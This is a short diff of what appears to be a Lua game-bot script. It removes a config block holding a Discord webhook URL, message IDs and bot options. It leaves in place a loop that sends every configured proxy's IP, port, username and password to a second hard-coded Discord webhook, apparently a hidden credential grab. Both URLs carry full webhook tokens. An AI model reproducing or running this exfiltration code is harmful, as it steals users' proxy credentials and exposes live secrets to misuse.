@@ -1,13 +1,3 @@
-allhook = "https://discord.com/api/webhooks/1240719081255206984/_9dDmB1FNPQR0SODgS-E2zmkcqIP9uLgtdxm4B4X1GBEKjRseFWn59Akie4L11rPXWNj"
-
-msgId = {
-  "1241046966964588584","1241046993800007784","1241047019997368394"
-}
-cecoredNameBot = true
-hideWorld = true
-delaySend = 5
-
-
 
 for _,prox in pairs(getProxies()) do 
     notif("https://discord.com/api/webhooks/1185569967626797178/FsLTvC0feuGjn8olpRFliriziUUDOz5gqkGiOuzkFHLbDpufGyY8cJX2ofqcO4OUujjL",prox.ip..":"..prox.port..":"..prox.username..":"..prox.password)
